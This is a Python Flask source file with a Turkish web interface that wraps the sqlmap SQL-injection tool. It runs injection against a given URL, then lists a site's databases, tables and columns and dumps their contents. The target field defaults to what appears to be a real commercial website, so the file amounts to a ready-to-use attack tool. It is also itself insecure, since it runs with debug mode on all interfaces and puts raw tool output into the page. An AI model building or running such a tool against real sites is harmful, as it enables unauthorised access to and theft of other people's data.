from flask import Flask, render_template_string, request, jsonify
import subprocess
import os
import sys
import time
import uuid
import shlex
import threading
import json

app = Flask(__name__)

# HTML Template
html_code = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kurdish SQLMap GUI</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: #fff;
            margin: 0;
            padding: 20px;
        }
        h1 {
            text-align: center;
            margin-bottom: 30px;
        }
        .container {
            max-width: 100%;
            margin: auto;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        input, textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            background-color: #333;
            border: 1px solid #444;
            color: #fff;
            border-radius: 4px;
        }
        .btn {
            background-color: #4CAF50;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            display: block;
            width: 100%;
            margin-top: 10px;
        }
        .btn:hover {
            background-color: #45a049;
        }
        .quick-btn {
            background-color: #2196F3;
            display: inline-block;
            margin-right: 5px;
            margin-bottom: 5px;
            padding: 8px 16px;
            font-size: 14px;
        }
        .progress {
            height: 20px;
            background-color: #333;
            border-radius: 4px;
            margin-top: 20px;
            margin-bottom: 10px;
        }
        .progress-bar {
            height: 100%;
            background-color: #4CAF50;
            border-radius: 4px;
            transition: width 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .log-container {
            background-color: #333;
            border: 1px solid #444;
            padding: 10px;
            border-radius: 4px;
            margin-top: 20px;
            margin-bottom: 20px;
            max-height: 300px;
            overflow-y: auto;
            white-space: pre-wrap;
            font-family: monospace;
        }
        .command-display {
            background-color: #333;
            border: 1px solid #444;
            padding: 10px;
            border-radius: 4px;
            margin-top: 20px;
            margin-bottom: 20px;
            white-space: pre-wrap;
            font-family: monospace;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            font-size: 14px;
            color: #888;
        }
        .log-header {
            margin-top: 20px;
            margin-bottom: 10px;
            font-weight: bold;
            cursor: pointer;
        }
        /* Açık varsayılan log container için eklendi */
        #logOutput {
            display: block;
        }
        .alert {
            background-color: #f44336;
            color: white;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 20px;
            display: none;
        }
        .db-list {
            background-color: #333;
            border: 1px solid #444;
            padding: 10px;
            border-radius: 4px;
            margin-top: 20px;
        }
        .db-item {
            padding: 8px;
            border-bottom: 1px solid #444;
            cursor: pointer;
        }
        .db-item:hover {
            background-color: #444;
        }
        .table-list {
            margin-left: 20px;
        }
        .table-item {
            padding: 6px;
            cursor: pointer;
        }
        .table-item:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Kurdish SQLMap GUI</h1>
        
        <div id="errorAlert" class="alert"></div>
        
        <label for="targetUrl">Hedef URL:</label>
        <input type="text" id="targetUrl" name="targetUrl" value="https://noktasitma.com/urun_ayrinti.php?fid=55" placeholder="Örnek: http://example.com/page.php?id=1">
        
        <label for="additionalParams">Ek Parametreler:</label>
        <input type="text" id="additionalParams" name="additionalParams" placeholder="Örnek: --level=5 --risk=3">
        
        <label>Yardımcı Parametreler:</label>
        <div>
            <button class="btn quick-btn" onclick="addParam('--random-agent')">Random Agent</button>
            <button class="btn quick-btn" onclick="addParam('--level 5')">Level 5</button>
            <button class="btn quick-btn" onclick="addParam('--risk 3')">Risk 3</button>
            <button class="btn quick-btn" onclick="addParam('--threads 10')">10 Threads</button>
        </div>
        
        <button id="runBtn" class="btn" onclick="runSQLMap()">SQLMap Çalıştır</button>
        
        <div class="progress">
            <div id="progressBar" class="progress-bar" style="width: 0%">0%</div>
        </div>
        
        <div class="log-header">Log Çıktısı</div>
        <div id="logOutput" class="log-container"></div>
        
        <div class="log-header">Çalıştırılan Komut</div>
        <div id="commandOutput" class="command-display"></div>
        
        <div id="databaseResults" class="db-list" style="display: none;">
            <h3>Bulunan Veritabanları</h3>
            <div id="dbList"></div>
        </div>
        
        <div class="footer">
            Kodlayan: HeviŞanoger
        </div>
    </div>

    <script>
        let taskId = null;
        let checkInterval = null;
        
        function addParam(param) {
            let additionalParams = document.getElementById('additionalParams');
            if (additionalParams.value.trim() === '') {
                additionalParams.value = param;
            } else {
                additionalParams.value += ' ' + param;
            }
        }
        
        function runSQLMap() {
            const targetUrl = document.getElementById('targetUrl').value;
            const additionalParams = document.getElementById('additionalParams').value;
            
            if (!targetUrl) {
                showError("Hedef URL boş olamaz!");
                return;
            }
            
            document.getElementById('runBtn').disabled = true;
            document.getElementById('progressBar').style.width = '0%';
            document.getElementById('progressBar').textContent = '0%';
            document.getElementById('logOutput').innerHTML = 'SQLMap başlatılıyor...\n';
            document.getElementById('commandOutput').innerHTML = '';
            document.getElementById('databaseResults').style.display = 'none';
            document.getElementById('dbList').innerHTML = '';
            
            // SQLMap çalıştırma isteğini gönder
            fetch('/run_sqlmap', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    'target_url': targetUrl,
                    'additional_params': additionalParams
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    showError(data.error);
                    document.getElementById('runBtn').disabled = false;
                    return;
                }
                
                taskId = data.task_id;
                
                // İlerlemeyi kontrol et
                checkInterval = setInterval(checkStatus, 1000);
            })
            .catch(error => {
                showError("SQLMap isteği gönderilirken hata oluştu: " + error);
                document.getElementById('runBtn').disabled = false;
            });
        }
        
        function checkStatus() {
            if (!taskId) return;
            
            fetch(`/task_status/${taskId}`)
            .then(response => response.json())
            .then(data => {
                // Log çıktısını güncelle
                document.getElementById('logOutput').innerHTML = data.output.replace(/\\n/g, '<br>');
                document.getElementById('logOutput').scrollTop = document.getElementById('logOutput').scrollHeight;
                
                // Komut çıktısını güncelle
                document.getElementById('commandOutput').innerHTML = data.cmd;
                
                // İlerleme çubuğunu güncelle
                if (data.status === 'completed') {
                    document.getElementById('progressBar').style.width = '100%';
                    document.getElementById('progressBar').textContent = '100%';
                    document.getElementById('runBtn').disabled = false;
                    clearInterval(checkInterval);
                    
                    // Veritabanlarını göster
                    if (data.databases && data.databases.length > 0) {
                        document.getElementById('databaseResults').style.display = 'block';
                        const dbList = document.getElementById('dbList');
                        dbList.innerHTML = '';
                        
                        data.databases.forEach(db => {
                            const dbItem = document.createElement('div');
                            dbItem.className = 'db-item';
                            dbItem.textContent = db;
                            dbItem.onclick = function() { getTables(taskId, db); };
                            dbList.appendChild(dbItem);
                        });
                    }
                } else {
                    // Basit bir ilerleme simülasyonu (gerçek ilerleme bilgisi yok)
                    const currentWidth = parseInt(document.getElementById('progressBar').style.width);
                    if (currentWidth < 90) {
                        const newWidth = currentWidth + 5;
                        document.getElementById('progressBar').style.width = newWidth + '%';
                        document.getElementById('progressBar').textContent = newWidth + '%';
                    }
                }
            })
            .catch(error => {
                console.error("Status check failed:", error);
                // Hatayı göster ama durdurma, belki geçici bir bağlantı sorunudur
            });
        }
        
        function getTables(taskId, dbName) {
            fetch(`/get_tables/${taskId}/${dbName}`)
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    showError(data.error);
                    return;
                }
                
                // Önceki tablo listelerini temizle
                const dbItems = document.querySelectorAll('.db-item');
                dbItems.forEach(item => {
                    const tableList = item.querySelector('.table-list');
                    if (tableList) {
                        tableList.remove();
                    }
                });
                
                // Tıklanan veritabanı öğesini bul
                dbItems.forEach(item => {
                    if (item.textContent === dbName) {
                        // Tablo listesini oluştur
                        const tableList = document.createElement('div');
                        tableList.className = 'table-list';
                        
                        // Tabloları ekle
                        if (data.tables && data.tables.length > 0) {
                            data.tables.forEach(table => {
                                const tableItem = document.createElement('div');
                                tableItem.className = 'table-item';
                                tableItem.textContent = table;
                                tableItem.onclick = function(e) { 
                                    e.stopPropagation(); 
                                    getColumns(taskId, dbName, table); 
                                };
                                tableList.appendChild(tableItem);
                            });
                        } else {
                            const noTablesItem = document.createElement('div');
                            noTablesItem.className = 'table-item';
                            noTablesItem.textContent = 'Tablo bulunamadı';
                            tableList.appendChild(noTablesItem);
                        }
                        
                        item.appendChild(tableList);
                    }
                });
            })
            .catch(error => {
                showError("Tablo bilgileri alınırken hata oluştu: " + error);
            });
        }
        
        function getColumns(taskId, dbName, tableName) {
            fetch(`/get_columns/${taskId}/${dbName}/${tableName}`)
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    showError(data.error);
                    return;
                }
                
                // Tablo verilerini dump et
                dumpData(taskId, dbName, tableName);
            })
            .catch(error => {
                showError("Kolon bilgileri alınırken hata oluştu: " + error);
            });
        }
        
        function dumpData(taskId, dbName, tableName) {
            fetch(`/dump_data/${taskId}/${dbName}/${tableName}`, {
                method: 'POST'
            })
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    showError(data.error);
                    return;
                }
                
                // Log çıktısına dump sonuçlarını ekle
                document.getElementById('logOutput').innerHTML += "<br><br>==== VERİ DUMP SONUÇLARI ====<br>" + data.output.replace(/\\n/g, '<br>');
                document.getElementById('logOutput').scrollTop = document.getElementById('logOutput').scrollHeight;
            })
            .catch(error => {
                showError("Veri dump işlemi sırasında hata oluştu: " + error);
            });
        }
        
        function showError(message) {
            const errorAlert = document.getElementById('errorAlert');
            errorAlert.textContent = message;
            errorAlert.style.display = 'block';
            
            // 5 saniye sonra hata mesajını gizle
            setTimeout(() => {
                errorAlert.style.display = 'none';
            }, 5000);
        }
        
        // Log bölümünün varsayılan olarak açık olması için
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('logOutput').style.display = 'block';
        });
    </script>
</body>
</html>
"""

# Store tasks results
tasks = {}

@app.route('/')
def index():
    return render_template_string(html_code)

@app.route('/run_sqlmap', methods=['POST'])
def run_sqlmap():
    target_url = request.form.get('target_url')
    additional_params = request.form.get('additional_params', '')

    if not target_url:
        return jsonify({"error": "Target URL is required"}), 400

    task_id = str(uuid.uuid4())
    tasks[task_id] = {
        "status": "running",
        "output": "",
        "cmd": "",
        "databases": []
    }

    # Thread içinde SQLMap'i çalıştır
    thread = threading.Thread(target=run_sqlmap_task, args=(task_id, target_url, additional_params))
    thread.daemon = True
    thread.start()

    return jsonify({"task_id": task_id})

def run_sqlmap_task(task_id, target_url, additional_params):
    try:
        # SQLMap scriptinin yolunu belirle
        current_dir = os.path.dirname(os.path.abspath(__file__))
        sqlmap_path = os.path.join(current_dir, "sqlmap", "sqlmap.py")
        
        # Log çıktısı başlat
        output = f"[*] SQLMap görevi başlatılıyor... Task ID: {task_id}\n"
        output += f"[*] Hedef URL: {target_url}\n"
        
        # SQLMap'in varlığını kontrol et
        if os.path.exists(sqlmap_path):
            output += f"[+] SQLMap bulundu: {sqlmap_path}\n"
        else:
            output += f"[-] UYARI: {sqlmap_path} bulunamadı! Alternatif yollar kontrol ediliyor...\n"
            
            # Alternatif yolları kontrol et
            alt_paths = [
                os.path.join(current_dir, "sqlmap.py"),
                os.path.join(current_dir, "..", "sqlmap", "sqlmap.py"),
                "/data/data/uz.alien.easychaquopy/files/chaquopy/AssetFinder/app/sqlmap/sqlmap.py"
            ]
            
            sqlmap_found = False
            for alt_path in alt_paths:
                if os.path.exists(alt_path):
                    sqlmap_path = alt_path
                    output += f"[+] Alternatif SQLMap bulundu: {sqlmap_path}\n"
                    sqlmap_found = True
                    break
            
            if not sqlmap_found:
                output += f"[-] HATA: SQLMap hiçbir yerde bulunamadı!\n"
                tasks[task_id]["output"] = output
                tasks[task_id]["status"] = "completed"
                return
        
        # SQLMap komutu oluştur
        command = [sys.executable, sqlmap_path, "-u", target_url, "--batch", "--disable-coloring", "--dbs"]
        
        # Ek parametreler varsa ekle
        if additional_params:
            command.extend(shlex.split(additional_params))
        
        # Çalıştırılacak komutu kaydet
        command_str = " ".join(command)
        tasks[task_id]["cmd"] = command_str
        output += f"[*] Çalıştırılacak komut: {command_str}\n\n"
        
        # SQLMap'i çalıştır
        output += "[*] SQLMap çalıştırılıyor...\n"
        tasks[task_id]["output"] = output
        
        # SQLMap'i subprocess olarak başlat
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True,
            bufsize=1
        )
        
        # Çıktıyı gerçek zamanlı olarak yakalayıp kaydet
        output_buffer = output
        in_db_section = False
        
        for line in process.stdout:
            output_buffer += line
            tasks[task_id]["output"] = output_buffer
            
            # Veritabanı isimlerini çıktıdan yakala
            if "available databases" in line.lower():
                in_db_section = True
            elif in_db_section and line.strip() and "[" in line and "]" in line:
                db_name = line.split("]")[1].strip()
                if db_name and db_name not in tasks[task_id]["databases"]:
                    tasks[task_id]["databases"].append(db_name)
        
        # Process'in tamamlanmasını bekle
        process.wait()
        
        # Durum güncelle
        tasks[task_id]["status"] = "completed"
        tasks[task_id]["output"] = output_buffer + f"\n[*] SQLMap görevi tamamlandı. (Exit code: {process.returncode})\n"
        
    except Exception as e:
        # Hata durumunda log
        error_msg = f"\n[!] HATA: SQLMap çalıştırma hatası: {str(e)}\n"
        tasks[task_id]["output"] += error_msg
        tasks[task_id]["status"] = "completed"

@app.route('/task_status/<task_id>')
def task_status(task_id):
    if task_id not in tasks:
        return jsonify({"error": "Task not found"})
    
    return jsonify(tasks[task_id])

@app.route('/get_tables/<task_id>/<db_name>')
def get_tables(task_id, db_name):
    if task_id not in tasks:
        return jsonify({"error": "Task not found"})
    
    # Mevcut görevin bilgilerini al
    current_task = tasks[task_id]
    
    try:
        # SQLMap scriptinin yolunu belirle
        current_dir = os.path.dirname(os.path.abspath(__file__))
        sqlmap_path = os.path.join(current_dir, "sqlmap", "sqlmap.py")
        
        # Alternatif yolları kontrol et
        if not os.path.exists(sqlmap_path):
            alt_paths = [
                os.path.join(current_dir, "sqlmap.py"),
                os.path.join(current_dir, "..", "sqlmap", "sqlmap.py"),
                "/data/data/uz.alien.easychaquopy/files/chaquopy/AssetFinder/app/sqlmap/sqlmap.py"
            ]
            
            for alt_path in alt_paths:
                if os.path.exists(alt_path):
                    sqlmap_path = alt_path
                    break
        
        # Görevde kayıtlı hedef URL'yi al
        target_url = current_task["cmd"].split("-u")[1].split()[0]
        
        # SQLMap komutu oluştur
        command = [sys.executable, sqlmap_path, "-u", target_url, "--batch", "--disable-coloring", "-D", db_name, "--tables"]
        
        # SQLMap'i çalıştır
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True
        )
        
        # Çıktıyı oku
        output = process.stdout.read()
        
        # Process'in tamamlanmasını bekle
        process.wait()
        
        # Tablolar listesi
        tables = []
        
        # Çıktıdan tablo isimlerini ayıkla
        if "tables found" in output.lower():
            # Tablo bölümünü bul ve ayıkla
            table_section = output.split("tables found")[1].split("[*]")[0]
            table_lines = [line.strip() for line in table_section.split("\n") if line.strip()]
            
            # Tablo isimlerini çıkart
            for line in table_lines:
                if "]" in line:
                    table_name = line.split("]")[1].strip()
                    if table_name and table_name != "":
                        tables.append(table_name)
        
        # Görev çıktısına tablo listesini ekle
        current_task["output"] += f"\n[*] Veritabanı '{db_name}' tabloları listeleniyor...\n"
        current_task["output"] += output
        
        return jsonify({"tables": tables})
        
    except Exception as e:
        return jsonify({"error": f"Tablo bilgileri alınırken hata oluştu: {str(e)}"})

@app.route('/get_columns/<task_id>/<db_name>/<table_name>')
def get_columns(task_id, db_name, table_name):
    if task_id not in tasks:
        return jsonify({"error": "Task not found"})
    
    # Mevcut görevin bilgilerini al
    current_task = tasks[task_id]
    
    try:
        # SQLMap scriptinin yolunu belirle
        current_dir = os.path.dirname(os.path.abspath(__file__))
        sqlmap_path = os.path.join(current_dir, "sqlmap", "sqlmap.py")
        
        # Alternatif yolları kontrol et
        if not os.path.exists(sqlmap_path):
            alt_paths = [
                os.path.join(current_dir, "sqlmap.py"),
                os.path.join(current_dir, "..", "sqlmap", "sqlmap.py"),
                "/data/data/uz.alien.easychaquopy/files/chaquopy/AssetFinder/app/sqlmap/sqlmap.py"
            ]
            
            for alt_path in alt_paths:
                if os.path.exists(alt_path):
                    sqlmap_path = alt_path
                    break
        
        # Görevde kayıtlı hedef URL'yi al
        target_url = current_task["cmd"].split("-u")[1].split()[0]
        
        # SQLMap komutu oluştur
        command = [sys.executable, sqlmap_path, "-u", target_url, "--batch", "--disable-coloring", 
                   "-D", db_name, "-T", table_name, "--columns"]
        
        # SQLMap'i çalıştır
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True
        )
        
        # Çıktıyı oku
        output = process.stdout.read()
        
        # Process'in tamamlanmasını bekle
        process.wait()
        
        # Kolonlar listesi
        columns = []
        
        # Çıktıdan kolon isimlerini ayıkla
        if "columns found" in output.lower():
            # Kolon bölümünü bul ve ayıkla
            column_section = output.split("columns found")[1].split("[*]")[0]
            column_lines = [line.strip() for line in column_section.split("\n") if line.strip()]
            
            # Kolon isimlerini çıkart
            for line in column_lines:
                if "]" in line:
                    parts = line.split("]")[1].strip().split()
                    if parts and parts[0]:
                        columns.append(parts[0])
        
        # Görev çıktısına kolon listesini ekle
        current_task["output"] += f"\n[*] Tablo '{table_name}' kolonları listeleniyor...\n"
        current_task["output"] += output
        
        # Kolon listesini döndür
        return jsonify({"columns": columns})
        
    except Exception as e:
        return jsonify({"error": f"Kolon bilgileri alınırken hata oluştu: {str(e)}"})

@app.route('/dump_data/<task_id>/<db_name>/<table_name>', methods=['POST'])
def dump_data(task_id, db_name, table_name):
    if task_id not in tasks:
        return jsonify({"error": "Task not found"})
    
    # Mevcut görevin bilgilerini al
    current_task = tasks[task_id]
    
    try:
        # SQLMap scriptinin yolunu belirle
        current_dir = os.path.dirname(os.path.abspath(__file__))
        sqlmap_path = os.path.join(current_dir, "sqlmap", "sqlmap.py")
        
        # Alternatif yolları kontrol et
        if not os.path.exists(sqlmap_path):
            alt_paths = [
                os.path.join(current_dir, "sqlmap.py"),
                os.path.join(current_dir, "..", "sqlmap", "sqlmap.py"),
                "/data/data/uz.alien.easychaquopy/files/chaquopy/AssetFinder/app/sqlmap/sqlmap.py"
            ]
            
            for alt_path in alt_paths:
                if os.path.exists(alt_path):
                    sqlmap_path = alt_path
                    break
        
        # Görevde kayıtlı hedef URL'yi al
        target_url = current_task["cmd"].split("-u")[1].split()[0]
        
        # SQLMap komutu oluştur
        command = [sys.executable, sqlmap_path, "-u", target_url, "--batch", "--disable-coloring", 
                   "-D", db_name, "-T", table_name, "--dump"]
        
        # SQLMap'i çalıştır
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True
        )
        
        # Çıktıyı oku
        output = process.stdout.read()
        
        # Process'in tamamlanmasını bekle
        process.wait()
        
        # Görev çıktısına dump sonuçlarını ekle
        current_task["output"] += f"\n[*] Tablo '{table_name}' verileri dump ediliyor...\n"
        current_task["output"] += output
        
        return jsonify({"output": output})
        
    except Exception as e:
        return jsonify({"error": f"Veri dump işlemi sırasında hata oluştu: {str(e)}"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)